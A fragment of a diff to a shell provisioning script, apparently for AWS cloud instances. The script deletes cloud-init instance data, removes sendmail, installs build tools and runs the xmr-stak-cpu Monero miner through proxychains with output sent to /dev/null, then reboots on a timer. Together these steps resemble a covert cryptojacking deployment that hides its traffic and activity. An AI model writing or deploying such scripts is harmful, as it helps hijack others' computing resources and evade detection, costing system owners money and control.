@@ -11,8 +11,8 @@ sudo sysctl -w vm.nr_hugepages=128
 #sudo ./build.sh
 rm -rf /var/lib/cloud/instance/*
 
-#file="/flag2"
-if [ -f "/flag2" ]
+file="/flag2"
+if [ -f "$file" ]
 then
   sudo yum remove sendmail -y
   sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
@@ -24,7 +24,7 @@ then
 	# sudo sed -i -e "\$ahttp    $VAR_PI    $VAR_PO    $VAR_PO  $VAR_PP" /m/test01/proxychains-ng/src/proxychains.conf
   ( sleep 86400 ; sudo reboot ) & 
   cd /m/test01/xmr
-  sudo cp /m/test01/xmr/config.aws /m/test01/xmr/config.txt
+  #sudo cp /m/test01/xmr/config.aws /m/test01/xmr/config.txt
   sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
   sudo reboot   
 else
